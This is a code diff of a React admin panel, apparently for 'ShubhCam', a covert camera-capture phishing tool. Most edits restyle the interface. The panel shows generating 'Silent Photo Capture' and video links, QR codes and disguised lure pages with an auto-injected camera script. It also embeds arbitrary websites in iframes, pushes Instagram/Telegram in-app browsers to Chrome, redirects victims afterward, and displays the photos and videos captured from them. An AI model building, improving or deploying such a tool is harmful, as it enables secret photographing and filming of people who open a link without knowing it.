@@ -235,7 +235,6 @@ const ShubhCam = () => {
     toast({ title: "Saved!", description: "Iframe URL synced" });
   };
 
-  // Get current QR link based on selection
   const getQrLinkUrl = () => {
     switch (selectedQrLink) {
       case "photo": return captureLink;
@@ -293,28 +292,31 @@ const ShubhCam = () => {
     { id: "config", icon: <Settings className="w-3.5 h-3.5" />, label: "Config" },
   ];
 
+  const glassInput = "bg-background/30 border-primary/20 text-foreground text-[10px] font-mono placeholder:text-muted-foreground/40 focus:border-primary/50 h-9";
+
   return (
     <div className="mt-6 w-full">
-      {/* Header Card */}
-      <div className="bg-gradient-to-r from-neon-green/10 via-background to-neon-green/5 border border-neon-green/30 rounded-xl p-4 mb-4">
+      {/* Header Card - Glassmorphic Premium */}
+      <div className="glass-card-warm rounded-2xl p-4 mb-4">
         <div className="flex items-center gap-3">
-          <div className="w-10 h-10 rounded-lg bg-neon-green/20 border border-neon-green/40 flex items-center justify-center">
-            <Camera className="w-5 h-5 text-neon-green" />
+          <div className="w-11 h-11 rounded-xl bg-gradient-to-br from-primary/30 to-secondary/30 border border-primary/30 flex items-center justify-center glow-gold">
+            <Camera className="w-5 h-5 text-primary" />
           </div>
           <div className="flex-1 min-w-0">
             <h2 className="font-display font-bold text-lg text-foreground tracking-wide">
-              CAM <span className="text-neon-green">CAPTURE</span>
+              VISION <span className="text-primary text-glow-gold">CAPTURE</span>
             </h2>
             <div className="flex items-center gap-2 text-xs text-muted-foreground">
-              <span className="font-mono text-neon-green/80">{sessionId}</span>
-              <span className="w-1 h-1 rounded-full bg-neon-green animate-pulse" />
+              <span className="font-mono text-primary/80">{sessionId}</span>
+              <span className="w-1.5 h-1.5 rounded-full bg-primary animate-pulse-glow" />
+              <span className="text-[10px]">Active</span>
             </div>
           </div>
         </div>
       </div>
 
-      {/* Tab Navigation - Grid Style */}
-      <div className="grid grid-cols-7 gap-1 mb-4">
+      {/* Tab Navigation - Premium Glassmorphic Grid */}
+      <div className="grid grid-cols-7 gap-1.5 mb-4">
         {tabs.map((tab) => (
           <button
             key={tab.id}
@@ -323,10 +325,10 @@ const ShubhCam = () => {
               if (tab.id === "media") { refreshPhotos(); loadVideos(); }
             }}
             className={cn(
-              "flex flex-col items-center justify-center gap-1 py-2 px-1 rounded-lg transition-all text-[10px] font-medium",
+              "flex flex-col items-center justify-center gap-1 py-2.5 px-1 rounded-xl transition-all text-[10px] font-semibold",
               activeTab === tab.id
-                ? "bg-neon-green text-background shadow-[0_0_12px_hsl(var(--neon-green)/0.4)]"
-                : "bg-card/50 border border-border/50 text-muted-foreground hover:border-neon-green/30 hover:text-neon-green"
+                ? "bg-gradient-to-br from-primary/30 to-secondary/20 text-primary border border-primary/30 glow-gold"
+                : "glass-card text-muted-foreground hover:border-primary/20 hover:text-primary/70"
             )}
           >
             {tab.icon}
@@ -335,45 +337,35 @@ const ShubhCam = () => {
         ))}
       </div>
 
-      {/* Content Area */}
-      <div className="bg-card/30 border border-border/50 rounded-xl p-4">
+      {/* Content Area - Glass Card */}
+      <div className="glass-card rounded-2xl p-4">
         
         {/* LINKS TAB */}
         {activeTab === "links" && (
           <div className="space-y-4">
-            {/* Quick Info */}
             <div className="grid grid-cols-3 gap-2 text-center">
-              <div className="bg-background/50 rounded-lg p-2 border border-border/30">
-                <Camera className="w-4 h-4 mx-auto mb-1 text-neon-green" />
-                <p className="text-[9px] text-muted-foreground">Photo</p>
-              </div>
-              <div className="bg-background/50 rounded-lg p-2 border border-border/30">
-                <Video className="w-4 h-4 mx-auto mb-1 text-neon-green" />
-                <p className="text-[9px] text-muted-foreground">{settings.camVideoDuration || 5}s Video</p>
-              </div>
-              <div className="bg-background/50 rounded-lg p-2 border border-border/30">
-                <Globe className="w-4 h-4 mx-auto mb-1 text-neon-green" />
-                <p className="text-[9px] text-muted-foreground truncate">{redirectUrl.replace(/https?:\/\//, '').slice(0, 10)}</p>
-              </div>
+              {[
+                { icon: Camera, label: "Photo", color: "text-primary" },
+                { icon: Video, label: `${settings.camVideoDuration || 5}s Video`, color: "text-secondary" },
+                { icon: Globe, label: redirectUrl.replace(/https?:\/\//, '').slice(0, 10), color: "text-accent" },
+              ].map((item, i) => (
+                <div key={i} className="glass-card rounded-xl p-2.5">
+                  <item.icon className={`w-4 h-4 mx-auto mb-1 ${item.color}`} />
+                  <p className="text-[9px] text-muted-foreground">{item.label}</p>
+                </div>
+              ))}
             </div>
 
             {/* Silent Photo Link */}
             <div className="space-y-2">
               <div className="flex items-center gap-2">
-                <Camera className="w-3.5 h-3.5 text-neon-green" />
-                <span className="text-xs font-medium text-foreground">Silent Photo Capture</span>
+                <Camera className="w-3.5 h-3.5 text-primary" />
+                <span className="text-xs font-semibold text-foreground">Silent Photo Capture</span>
               </div>
               <div className="flex gap-2">
-                <Input
-                  value={captureLink}
-                  readOnly
-                  className="bg-background/50 border-neon-green/30 text-[10px] font-mono text-neon-green h-9"
-                />
-                <Button
-                  size="icon"
-                  onClick={() => copyToClipboard(captureLink)}
-                  className="h-9 w-9 bg-neon-green text-background hover:bg-neon-green/90 shrink-0"
-                >
+                <Input value={captureLink} readOnly className={glassInput} />
+                <Button size="icon" onClick={() => copyToClipboard(captureLink)}
+                  className="h-9 w-9 bg-primary text-primary-foreground hover:bg-primary/90 shrink-0 glow-gold">
                   <Copy className="w-3.5 h-3.5" />
                 </Button>
               </div>
@@ -382,20 +374,13 @@ const ShubhCam = () => {
             {/* Video Link */}
             <div className="space-y-2">
               <div className="flex items-center gap-2">
-                <Video className="w-3.5 h-3.5 text-neon-green" />
-                <span className="text-xs font-medium text-foreground">Video Capture ({settings.camVideoDuration || 5}s)</span>
+                <Video className="w-3.5 h-3.5 text-secondary" />
+                <span className="text-xs font-semibold text-foreground">Video Capture ({settings.camVideoDuration || 5}s)</span>
               </div>
               <div className="flex gap-2">
-                <Input
-                  value={videoCaptureLink}
-                  readOnly
-                  className="bg-background/50 border-neon-green/30 text-[10px] font-mono text-neon-green h-9"
-                />
-                <Button
-                  size="icon"
-                  onClick={() => copyToClipboard(videoCaptureLink)}
-                  className="h-9 w-9 bg-neon-green text-background hover:bg-neon-green/90 shrink-0"
-                >
+                <Input value={videoCaptureLink} readOnly className={glassInput} />
+                <Button size="icon" onClick={() => copyToClipboard(videoCaptureLink)}
+                  className="h-9 w-9 bg-secondary text-secondary-foreground hover:bg-secondary/90 shrink-0 glow-pink">
                   <Copy className="w-3.5 h-3.5" />
                 </Button>
               </div>
@@ -411,25 +396,17 @@ const ShubhCam = () => {
                 value={redirectUrl}
                 onChange={(e) => updateSettings({ camRedirectUrl: e.target.value })}
                 placeholder="https://google.com"
-                className="bg-background/50 border-border/50 text-xs h-9"
+                className="bg-background/30 border-border/50 text-xs h-9"
               />
             </div>
 
-            {/* Action Buttons */}
             <div className="grid grid-cols-2 gap-2">
-              <Button
-                onClick={() => window.open(captureLink, '_blank')}
-                variant="outline"
-                size="sm"
-                className="border-neon-green/30 text-neon-green hover:bg-neon-green/10 text-xs"
-              >
+              <Button onClick={() => window.open(captureLink, '_blank')} variant="outline" size="sm"
+                className="border-primary/30 text-primary hover:bg-primary/10 text-xs">
                 <ExternalLink className="w-3 h-3 mr-1" /> Test Link
               </Button>
-              <Button
-                onClick={() => { refreshPhotos(); loadVideos(); }}
-                size="sm"
-                className="bg-neon-green/20 text-neon-green hover:bg-neon-green/30 text-xs"
-              >
+              <Button onClick={() => { refreshPhotos(); loadVideos(); }} size="sm"
+                className="bg-primary/20 text-primary hover:bg-primary/30 text-xs">
                 <RefreshCw className="w-3 h-3 mr-1" /> Refresh
               </Button>
             </div>
@@ -439,39 +416,29 @@ const ShubhCam = () => {
         {/* QR CODE TAB */}
         {activeTab === "qr" && (
           <div className="space-y-4">
-            {/* Link Selector */}
             <div className="space-y-2">
               <div className="flex items-center gap-2">
-                <QrCode className="w-3.5 h-3.5 text-neon-green" />
-                <span className="text-xs font-medium">Select Link Type</span>
+                <QrCode className="w-3.5 h-3.5 text-primary" />
+                <span className="text-xs font-semibold">Select Link Type</span>
               </div>
               <div className="grid grid-cols-5 gap-1">
                 {(["photo", "video", "custom", "chrome", "iframe"] as const).map((type) => (
-                  <button
-                    key={type}
-                    onClick={() => setSelectedQrLink(type)}
+                  <button key={type} onClick={() => setSelectedQrLink(type)}
                     className={cn(
-                      "py-1.5 px-2 rounded-lg text-[9px] font-medium transition-all capitalize",
+                      "py-1.5 px-2 rounded-lg text-[9px] font-semibold transition-all capitalize",
                       selectedQrLink === type
-                        ? "bg-neon-green text-background"
-                        : "bg-background/50 border border-border/30 text-muted-foreground hover:border-neon-green/30"
-                    )}
-                  >
+                        ? "bg-primary text-primary-foreground glow-gold"
+                        : "glass-card text-muted-foreground hover:border-primary/30"
+                    )}>
                     {type === "photo" ? "📷" : type === "video" ? "🎥" : type === "custom" ? "📝" : type === "chrome" ? "🌐" : "📱"}
                   </button>
                 ))}
               </div>
-              <p className="text-[10px] text-muted-foreground text-center">
-                {getQrLinkLabel()} Capture Link
-              </p>
+              <p className="text-[10px] text-muted-foreground text-center">{getQrLinkLabel()} Capture Link</p>
             </div>
 
-            {/* QR Code Display */}
             <div className="flex justify-center">
-              <div 
-                ref={qrRef}
-                className="p-4 rounded-xl bg-white border-2 border-neon-green/30 shadow-[0_0_20px_hsl(var(--neon-green)/0.2)]"
-              >
+              <div ref={qrRef} className="p-4 rounded-xl bg-white border-2 border-primary/40 glow-gold">
                 <QRCodeSVG
                   value={getQrLinkUrl()}
                   size={settings.qrSize || 180}
@@ -483,21 +450,12 @@ const ShubhCam = () => {
               </div>
             </div>
 
-            {/* QR Actions */}
             <div className="grid grid-cols-2 gap-2">
-              <Button
-                onClick={downloadQrCode}
-                size="sm"
-                className="bg-neon-green text-background hover:bg-neon-green/90 text-xs"
-              >
+              <Button onClick={downloadQrCode} size="sm" className="bg-primary text-primary-foreground hover:bg-primary/90 text-xs glow-gold">
                 <Download className="w-3 h-3 mr-1" /> Download
               </Button>
-              <Button
-                onClick={() => copyToClipboard(getQrLinkUrl())}
-                variant="outline"
-                size="sm"
-                className="border-neon-green/30 text-neon-green hover:bg-neon-green/10 text-xs"
-              >
+              <Button onClick={() => copyToClipboard(getQrLinkUrl())} variant="outline" size="sm"
+                className="border-primary/30 text-primary hover:bg-primary/10 text-xs">
                 <Copy className="w-3 h-3 mr-1" /> Copy Link
               </Button>
             </div>
@@ -505,79 +463,46 @@ const ShubhCam = () => {
             {/* QR Settings */}
             <div className="space-y-3 pt-3 border-t border-border/30">
               <div className="flex items-center gap-2">
-                <Palette className="w-3.5 h-3.5 text-neon-green" />
-                <span className="text-xs font-medium">QR Settings</span>
+                <Palette className="w-3.5 h-3.5 text-primary" />
+                <span className="text-xs font-semibold">QR Settings</span>
               </div>
-
-              {/* Size */}
               <div className="space-y-2">
                 <div className="flex justify-between text-[10px]">
                   <span className="text-muted-foreground">Size</span>
-                  <span className="text-neon-green font-mono">{settings.qrSize || 180}px</span>
+                  <span className="text-primary font-mono">{settings.qrSize || 180}px</span>
                 </div>
-                <Slider
-                  value={[settings.qrSize || 180]}
-                  onValueChange={([val]) => updateSettings({ qrSize: val })}
-                  min={100}
-                  max={300}
-                  step={10}
-                  className="py-2"
-                />
+                <Slider value={[settings.qrSize || 180]} onValueChange={([val]) => updateSettings({ qrSize: val })} min={100} max={300} step={10} className="py-2" />
               </div>
 
-              {/* Colors */}
               <div className="grid grid-cols-2 gap-3">
                 <div className="space-y-1">
                   <label className="text-[10px] text-muted-foreground">QR Color</label>
                   <div className="flex gap-2">
-                    <input
-                      type="color"
-                      value={settings.qrFgColor || "#22c55e"}
-                      onChange={(e) => updateSettings({ qrFgColor: e.target.value })}
-                      className="w-8 h-8 rounded cursor-pointer border border-border/30"
-                    />
-                    <Input
-                      value={settings.qrFgColor || "#22c55e"}
-                      onChange={(e) => updateSettings({ qrFgColor: e.target.value })}
-                      className="bg-background/50 border-border/50 font-mono text-[10px] h-8 flex-1"
-                    />
+                    <input type="color" value={settings.qrFgColor || "#22c55e"} onChange={(e) => updateSettings({ qrFgColor: e.target.value })} className="w-8 h-8 rounded cursor-pointer border border-border/30" />
+                    <Input value={settings.qrFgColor || "#22c55e"} onChange={(e) => updateSettings({ qrFgColor: e.target.value })} className="bg-background/30 border-border/50 font-mono text-[10px] h-8 flex-1" />
                   </div>
                 </div>
                 <div className="space-y-1">
                   <label className="text-[10px] text-muted-foreground">Background</label>
                   <div className="flex gap-2">
-                    <input
-                      type="color"
-                      value={settings.qrBgColor || "#000000"}
-                      onChange={(e) => updateSettings({ qrBgColor: e.target.value })}
-                      className="w-8 h-8 rounded cursor-pointer border border-border/30"
-                    />
-                    <Input
-                      value={settings.qrBgColor || "#000000"}
-                      onChange={(e) => updateSettings({ qrBgColor: e.target.value })}
-                      className="bg-background/50 border-border/50 font-mono text-[10px] h-8 flex-1"
-                    />
+                    <input type="color" value={settings.qrBgColor || "#000000"} onChange={(e) => updateSettings({ qrBgColor: e.target.value })} className="w-8 h-8 rounded cursor-pointer border border-border/30" />
+                    <Input value={settings.qrBgColor || "#000000"} onChange={(e) => updateSettings({ qrBgColor: e.target.value })} className="bg-background/30 border-border/50 font-mono text-[10px] h-8 flex-1" />
                   </div>
                 </div>
               </div>
 
-              {/* Quick Color Presets */}
               <div className="space-y-1">
                 <label className="text-[10px] text-muted-foreground">Presets</label>
                 <div className="flex gap-2 flex-wrap">
                   {[
-                    { fg: "#22c55e", bg: "#000000", name: "Neon" },
+                    { fg: "#d4a017", bg: "#0a0a12", name: "Gold" },
                     { fg: "#000000", bg: "#ffffff", name: "Classic" },
-                    { fg: "#ec4899", bg: "#000000", name: "Pink" },
-                    { fg: "#0ea5e9", bg: "#000000", name: "Cyan" },
-                    { fg: "#ffffff", bg: "#1a1a2e", name: "Dark" },
+                    { fg: "#ec4899", bg: "#0a0a12", name: "Rose" },
+                    { fg: "#06b6d4", bg: "#0a0a12", name: "Cyan" },
+                    { fg: "#a855f7", bg: "#0a0a12", name: "Purple" },
                   ].map((preset) => (
-                    <button
-                      key={preset.name}
-                      onClick={() => updateSettings({ qrFgColor: preset.fg, qrBgColor: preset.bg })}
-                      className="px-2 py-1 rounded text-[9px] bg-background/50 border border-border/30 hover:border-neon-green/30 transition-colors"
-                      style={{ color: preset.fg }}
-                    >
+                    <button key={preset.name} onClick={() => updateSettings({ qrFgColor: preset.fg, qrBgColor: preset.bg })}
+                      className="px-2 py-1 rounded text-[9px] glass-card hover:border-primary/30 transition-colors" style={{ color: preset.fg }}>
                       {preset.name}
                     </button>
                   ))}
@@ -585,12 +510,9 @@ const ShubhCam = () => {
               </div>
             </div>
 
-            {/* Link Preview */}
-            <div className="bg-background/30 rounded-lg p-2 border border-border/30">
+            <div className="glass-card rounded-lg p-2">
               <p className="text-[9px] text-muted-foreground mb-1">Link URL:</p>
-              <p className="text-[10px] font-mono text-neon-green break-all">
-                {getQrLinkUrl()}
-              </p>
+              <p className="text-[10px] font-mono text-primary break-all">{getQrLinkUrl()}</p>
             </div>
           </div>
         )}
@@ -598,77 +520,55 @@ const ShubhCam = () => {
         {/* CHROME TAB */}
         {activeTab === "chrome" && (
           <div className="space-y-4">
-            {/* Info */}
-            <div className="bg-neon-green/5 border border-neon-green/20 rounded-lg p-3">
+            <div className="glass-card-warm rounded-xl p-3">
               <div className="flex items-start gap-2">
-                <Smartphone className="w-4 h-4 text-neon-green shrink-0 mt-0.5" />
+                <Smartphone className="w-4 h-4 text-primary shrink-0 mt-0.5" />
                 <div className="text-xs text-muted-foreground space-y-1">
-                  <p className="text-foreground font-medium">Android In-App Browser → Chrome</p>
+                  <p className="text-foreground font-semibold">Android In-App Browser → Chrome</p>
                   <p>Instagram/Telegram ke browser se auto Chrome redirect</p>
                 </div>
               </div>
             </div>
 
-            {/* Chrome Custom HTML Upload */}
             <div className="space-y-3">
               <div className="flex items-center gap-2">
-                <Code className="w-3.5 h-3.5 text-neon-green" />
-                <span className="text-xs font-medium">Chrome Custom HTML</span>
+                <Code className="w-3.5 h-3.5 text-primary" />
+                <span className="text-xs font-semibold">Chrome Custom HTML</span>
               </div>
               
               <input type="file" accept=".html,.htm" ref={chromeFileInputRef} onChange={handleChromeFileUpload} className="hidden" />
               
-              <Button
-                onClick={() => chromeFileInputRef.current?.click()}
-                variant="outline"
-                size="sm"
-                className="w-full border-neon-green/30 text-neon-green hover:bg-neon-green/10 text-xs"
-              >
+              <Button onClick={() => chromeFileInputRef.current?.click()} variant="outline" size="sm"
+                className="w-full border-primary/30 text-primary hover:bg-primary/10 text-xs">
                 <Upload className="w-3 h-3 mr-1" /> Upload HTML
               </Button>
 
-              <Textarea
-                value={chromeCustomHtml}
-                onChange={(e) => setChromeCustomHtml(e.target.value)}
+              <Textarea value={chromeCustomHtml} onChange={(e) => setChromeCustomHtml(e.target.value)}
                 placeholder="Paste HTML code..."
-                className="bg-background/50 border-border/50 font-mono text-[10px] min-h-[100px] resize-none"
-              />
+                className="bg-background/30 border-border/30 font-mono text-[10px] min-h-[100px] resize-none" />
 
-              <Button
-                onClick={saveChromeCustomHtml}
-                size="sm"
-                className="w-full bg-neon-green text-background hover:bg-neon-green/90 text-xs"
-              >
+              <Button onClick={saveChromeCustomHtml} size="sm" className="w-full bg-primary text-primary-foreground hover:bg-primary/90 text-xs glow-gold">
                 <Zap className="w-3 h-3 mr-1" /> Save Chrome HTML
               </Button>
             </div>
 
-            {/* Chrome Link */}
             {chromeCustomHtml && (
               <div className="space-y-2 pt-2 border-t border-border/30">
                 <div className="flex items-center gap-2">
-                  <Chrome className="w-3.5 h-3.5 text-neon-green" />
-                  <span className="text-xs font-medium">Chrome Capture Link</span>
+                  <Chrome className="w-3.5 h-3.5 text-primary" />
+                  <span className="text-xs font-semibold">Chrome Capture Link</span>
                 </div>
                 <div className="flex gap-2">
-                  <Input
-                    value={chromeCustomCaptureLink}
-                    readOnly
-                    className="bg-background/50 border-neon-green/30 text-[10px] font-mono text-neon-green h-9"
-                  />
-                  <Button
-                    size="icon"
-                    onClick={() => copyToClipboard(chromeCustomCaptureLink)}
-                    className="h-9 w-9 bg-neon-green text-background hover:bg-neon-green/90 shrink-0"
-                  >
+                  <Input value={chromeCustomCaptureLink} readOnly className={glassInput} />
+                  <Button size="icon" onClick={() => copyToClipboard(chromeCustomCaptureLink)}
+                    className="h-9 w-9 bg-primary text-primary-foreground hover:bg-primary/90 shrink-0">
                     <Copy className="w-3.5 h-3.5" />
                   </Button>
                 </div>
               </div>
             )}
 
-            {/* Warning */}
-            <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-2 text-[10px] text-muted-foreground">
+            <div className="bg-destructive/10 border border-destructive/20 rounded-xl p-2 text-[10px] text-muted-foreground">
               ⚠️ Sirf Android pe kaam karta hai. iOS supported nahi.
             </div>
           </div>
@@ -677,7 +577,7 @@ const ShubhCam = () => {
         {/* HTML TAB */}
         {activeTab === "html" && (
           <div className="space-y-4">
-            <div className="bg-neon-green/5 border border-neon-green/20 rounded-lg p-3">
+            <div className="glass-card-warm rounded-xl p-3">
               <p className="text-xs text-muted-foreground">
                 Upload custom HTML for capture page. Camera script auto-injected.
               </p>
@@ -685,53 +585,31 @@ const ShubhCam = () => {
 
             <input type="file" accept=".html,.htm" ref={fileInputRef} onChange={handleFileUpload} className="hidden" />
             
-            <Button
-              onClick={() => fileInputRef.current?.click()}
-              variant="outline"
-              size="sm"
-              className="w-full border-neon-green/30 text-neon-green hover:bg-neon-green/10 text-xs"
-            >
+            <Button onClick={() => fileInputRef.current?.click()} variant="outline" size="sm"
+              className="w-full border-primary/30 text-primary hover:bg-primary/10 text-xs">
               <Upload className="w-3 h-3 mr-1" /> Upload HTML File
             </Button>
 
-            <Textarea
-              value={customHtml}
-              onChange={(e) => setCustomHtml(e.target.value)}
+            <Textarea value={customHtml} onChange={(e) => setCustomHtml(e.target.value)}
               placeholder="Paste HTML code here..."
-              className="bg-background/50 border-border/50 font-mono text-[10px] min-h-[150px] resize-none"
-            />
+              className="bg-background/30 border-border/30 font-mono text-[10px] min-h-[150px] resize-none" />
 
-            <Button
-              onClick={saveCustomHtml}
-              size="sm"
-              className="w-full bg-neon-green text-background hover:bg-neon-green/90 text-xs"
-            >
+            <Button onClick={saveCustomHtml} size="sm" className="w-full bg-primary text-primary-foreground hover:bg-primary/90 text-xs glow-gold">
               <Zap className="w-3 h-3 mr-1" /> Save HTML
             </Button>
 
             {customHtml && (
               <div className="space-y-2 pt-3 border-t border-border/30">
-                <span className="text-xs font-medium text-foreground">Custom Capture Link</span>
+                <span className="text-xs font-semibold text-foreground">Custom Capture Link</span>
                 <div className="flex gap-2">
-                  <Input
-                    value={customCaptureLink}
-                    readOnly
-                    className="bg-background/50 border-neon-green/30 text-[10px] font-mono text-neon-green h-9"
-                  />
-                  <Button
-                    size="icon"
-                    onClick={() => copyToClipboard(customCaptureLink)}
-                    className="h-9 w-9 bg-neon-green text-background hover:bg-neon-green/90 shrink-0"
-                  >
+                  <Input value={customCaptureLink} readOnly className={glassInput} />
+                  <Button size="icon" onClick={() => copyToClipboard(customCaptureLink)}
+                    className="h-9 w-9 bg-primary text-primary-foreground hover:bg-primary/90 shrink-0">
                     <Copy className="w-3.5 h-3.5" />
                   </Button>
                 </div>
-                <Button
-                  onClick={() => window.open(customCaptureLink, '_blank')}
-                  variant="outline"
-                  size="sm"
-                  className="w-full border-neon-green/30 text-neon-green hover:bg-neon-green/10 text-xs"
-                >
+                <Button onClick={() => window.open(customCaptureLink, '_blank')} variant="outline" size="sm"
+                  className="w-full border-primary/30 text-primary hover:bg-primary/10 text-xs">
                   <ExternalLink className="w-3 h-3 mr-1" /> Test Custom Link
                 </Button>
               </div>
@@ -742,11 +620,11 @@ const ShubhCam = () => {
         {/* IFRAME TAB */}
         {activeTab === "iframe" && (
           <div className="space-y-4">
-            <div className="bg-neon-green/5 border border-neon-green/20 rounded-lg p-3">
+            <div className="glass-card-warm rounded-xl p-3">
               <div className="flex items-start gap-2">
-                <LayoutGrid className="w-4 h-4 text-neon-green shrink-0 mt-0.5" />
+                <LayoutGrid className="w-4 h-4 text-primary shrink-0 mt-0.5" />
                 <div className="text-xs text-muted-foreground space-y-1">
-                  <p className="text-foreground font-medium">Iframe Capture Page</p>
+                  <p className="text-foreground font-semibold">Iframe Capture Page</p>
                   <p>Koi bhi website embed karo capture page me</p>
                 </div>
               </div>
@@ -754,22 +632,15 @@ const ShubhCam = () => {
 
             <div className="space-y-3">
               <div className="flex items-center gap-2">
-                <Globe className="w-3.5 h-3.5 text-neon-green" />
-                <span className="text-xs font-medium">Website URL</span>
+                <Globe className="w-3.5 h-3.5 text-primary" />
+                <span className="text-xs font-semibold">Website URL</span>
               </div>
               
-              <Input
-                value={iframeUrl}
-                onChange={(e) => setIframeUrl(e.target.value)}
+              <Input value={iframeUrl} onChange={(e) => setIframeUrl(e.target.value)}
                 placeholder="https://example.com"
-                className="bg-background/50 border-border/50 font-mono text-xs h-9"
-              />
+                className="bg-background/30 border-border/30 font-mono text-xs h-9" />
 
-              <Button
-                onClick={saveIframeUrl}
-                size="sm"
-                className="w-full bg-neon-green text-background hover:bg-neon-green/90 text-xs"
-              >
+              <Button onClick={saveIframeUrl} size="sm" className="w-full bg-primary text-primary-foreground hover:bg-primary/90 text-xs glow-gold">
                 <Zap className="w-3 h-3 mr-1" /> Save URL
               </Button>
             </div>
@@ -777,35 +648,24 @@ const ShubhCam = () => {
             {iframeUrl && (
               <div className="space-y-2 pt-3 border-t border-border/30">
                 <div className="flex items-center gap-2">
-                  <LayoutGrid className="w-3.5 h-3.5 text-neon-green" />
-                  <span className="text-xs font-medium">Iframe Capture Link</span>
+                  <LayoutGrid className="w-3.5 h-3.5 text-primary" />
+                  <span className="text-xs font-semibold">Iframe Capture Link</span>
                 </div>
                 <div className="flex gap-2">
-                  <Input
-                    value={iframeCaptureLink}
-                    readOnly
-                    className="bg-background/50 border-neon-green/30 text-[10px] font-mono text-neon-green h-9"
-                  />
-                  <Button
-                    size="icon"
-                    onClick={() => copyToClipboard(iframeCaptureLink)}
-                    className="h-9 w-9 bg-neon-green text-background hover:bg-neon-green/90 shrink-0"
-                  >
+                  <Input value={iframeCaptureLink} readOnly className={glassInput} />
+                  <Button size="icon" onClick={() => copyToClipboard(iframeCaptureLink)}
+                    className="h-9 w-9 bg-primary text-primary-foreground hover:bg-primary/90 shrink-0">
                     <Copy className="w-3.5 h-3.5" />
                   </Button>
                 </div>
-                <Button
-                  onClick={() => window.open(iframeCaptureLink, '_blank')}
-                  variant="outline"
-                  size="sm"
-                  className="w-full border-neon-green/30 text-neon-green hover:bg-neon-green/10 text-xs"
-                >
+                <Button onClick={() => window.open(iframeCaptureLink, '_blank')} variant="outline" size="sm"
+                  className="w-full border-primary/30 text-primary hover:bg-primary/10 text-xs">
                   <ExternalLink className="w-3 h-3 mr-1" /> Test Iframe Link
                 </Button>
               </div>
             )}
 
-            <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-2 text-[10px] text-muted-foreground">
+            <div className="bg-destructive/10 border border-destructive/20 rounded-xl p-2 text-[10px] text-muted-foreground">
               ⚠️ Kuch websites iframe allow nahi karti (X-Frame-Options). Test karke dekho.
             </div>
           </div>
@@ -816,7 +676,7 @@ const ShubhCam = () => {
           <div className="space-y-4">
             {loading ? (
               <div className="flex items-center justify-center py-12">
-                <div className="w-6 h-6 border-2 border-neon-green border-t-transparent rounded-full animate-spin" />
+                <div className="w-6 h-6 border-2 border-primary border-t-transparent rounded-full animate-spin" />
               </div>
             ) : photos.length === 0 && videos.length === 0 ? (
               <div className="text-center py-12">
@@ -828,59 +688,44 @@ const ShubhCam = () => {
               <>
                 <div className="flex justify-between items-center">
                   <span className="text-[10px] text-muted-foreground">{photos.length} photos • {videos.length} videos</span>
-                  <Button
-                    variant="ghost"
-                    size="sm"
-                    onClick={clearAllPhotos}
-                    className="text-destructive hover:text-destructive text-[10px] h-7 px-2"
-                  >
+                  <Button variant="ghost" size="sm" onClick={clearAllPhotos}
+                    className="text-destructive hover:text-destructive text-[10px] h-7 px-2">
                     <Trash2 className="w-3 h-3 mr-1" /> Clear
                   </Button>
                 </div>
                 
                 <div className="grid grid-cols-3 gap-2">
                   {photos.map((photo) => (
-                    <div
-                      key={`p-${photo.id}`}
-                      className="relative aspect-square rounded-lg overflow-hidden border border-neon-green/20 bg-background/50 cursor-pointer group"
-                      onClick={() => setViewingPhoto(photo)}
-                    >
+                    <div key={`p-${photo.id}`}
+                      className="relative aspect-square rounded-xl overflow-hidden border border-primary/20 bg-background/50 cursor-pointer group"
+                      onClick={() => setViewingPhoto(photo)}>
                       <img src={photo.image_data} alt="" className="w-full h-full object-cover" />
                       <div className="absolute inset-0 bg-background/70 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
-                        <Eye className="w-5 h-5 text-neon-green" />
+                        <Eye className="w-5 h-5 text-primary" />
                       </div>
-                      <div className="absolute top-1 left-1 bg-neon-green/90 text-background text-[7px] px-1 rounded font-bold">
-                        IMG
-                      </div>
+                      <div className="absolute top-1 left-1 bg-primary/90 text-primary-foreground text-[7px] px-1 rounded font-bold">IMG</div>
                     </div>
                   ))}
                   {videos.map((video) => (
-                    <div
-                      key={`v-${video.id}`}
-                      className="relative aspect-square rounded-lg overflow-hidden border border-neon-green/20 bg-background/50 cursor-pointer group"
-                      onClick={() => setViewingVideo(video)}
-                    >
+                    <div key={`v-${video.id}`}
+                      className="relative aspect-square rounded-xl overflow-hidden border border-secondary/20 bg-background/50 cursor-pointer group"
+                      onClick={() => setViewingVideo(video)}>
                       <video src={video.video_url} className="w-full h-full object-cover" />
                       <div className="absolute inset-0 bg-background/70 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
-                        <Play className="w-5 h-5 text-neon-green" />
+                        <Play className="w-5 h-5 text-secondary" />
                       </div>
-                      <div className="absolute top-1 left-1 bg-neon-green/90 text-background text-[7px] px-1 rounded font-bold flex items-center gap-0.5">
+                      <div className="absolute top-1 left-1 bg-secondary/90 text-secondary-foreground text-[7px] px-1 rounded font-bold flex items-center gap-0.5">
                         <Play className="w-2 h-2" /> VID
                       </div>
-                      <div className="absolute top-1 right-1 bg-background/70 text-neon-green text-[7px] px-1 rounded font-mono">
-                        {video.duration_seconds}s
-                      </div>
+                      <div className="absolute top-1 right-1 bg-background/70 text-primary text-[7px] px-1 rounded font-mono">{video.duration_seconds}s</div>
                     </div>
                   ))}
                 </div>
               </>
             )}
 
-            <Button
-              onClick={() => { refreshPhotos(); loadVideos(); }}
-              size="sm"
-              className="w-full bg-neon-green text-background hover:bg-neon-green/90 text-xs"
-            >
+            <Button onClick={() => { refreshPhotos(); loadVideos(); }} size="sm"
+              className="w-full bg-primary text-primary-foreground hover:bg-primary/90 text-xs glow-gold">
               <RefreshCw className="w-3 h-3 mr-1" /> Refresh Media
             </Button>
           </div>
@@ -889,107 +734,68 @@ const ShubhCam = () => {
         {/* CONFIG TAB */}
         {activeTab === "config" && (
           <div className="space-y-4">
-
-            {/* Photo Settings */}
             <div className="space-y-3 pt-3 border-t border-border/30">
               <div className="flex items-center gap-2">
-                <Camera className="w-3.5 h-3.5 text-neon-green" />
-                <span className="text-xs font-medium">Photo Settings</span>
+                <Camera className="w-3.5 h-3.5 text-primary" />
+                <span className="text-xs font-semibold text-foreground">Photo Settings</span>
               </div>
-              
               <div className="space-y-2">
                 <div className="flex justify-between text-[10px]">
                   <span className="text-muted-foreground">Photo Limit (0=∞)</span>
-                  <span className="text-neon-green font-mono">{settings.camPhotoLimit || 0}</span>
+                  <span className="text-primary font-mono">{settings.camPhotoLimit || 0}</span>
                 </div>
-                <Input
-                  type="number"
-                  min="0"
-                  max="100"
